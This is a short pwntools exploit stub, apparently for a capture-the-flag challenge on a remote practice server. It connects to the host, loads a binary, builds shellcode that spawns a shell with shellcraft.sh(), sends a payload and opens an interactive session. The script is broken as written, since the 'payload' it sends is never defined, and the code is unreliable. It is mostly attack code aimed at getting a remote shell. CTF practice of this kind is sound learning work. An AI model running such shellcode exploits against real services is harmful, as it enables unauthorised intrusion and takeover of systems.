from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')
 
#p = process('./pwn')
p = remote('node4.buuoj.cn',29928)
elf = ELF('./111')
shellcode=asm(shellcraft.sh())
p.sendline(payload)
p.interactive()